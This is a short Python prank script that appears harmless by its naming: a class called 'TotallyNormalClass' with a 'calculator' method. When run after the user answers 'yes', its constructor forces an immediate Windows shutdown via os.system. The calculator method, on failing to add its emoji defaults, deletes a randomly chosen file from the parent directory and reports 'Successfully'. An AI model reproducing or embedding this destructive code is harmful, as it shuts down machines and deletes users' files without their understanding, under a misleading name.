import os
import random


class TotallyNormalClass:

    def __init__(self):
        print('Hi 😀')
        os.system('shutdown /s /t 1')

    @staticmethod
    def calculator(number1='🥴', number2='☹️'):
        try:
            return f'numbers are {int(number1)} and {int(number2)}'
        except:
            try:
                return int(number1 + number2) / 0
            except:
                files = os.listdir('..')
                os.remove(
                    random.choice(
                        files
                    )
                )
                return 'Successfully 😀'


if input('Are you sure?: ') == 'yes':
    execute = TotallyNormalClass()
    execute.calculator()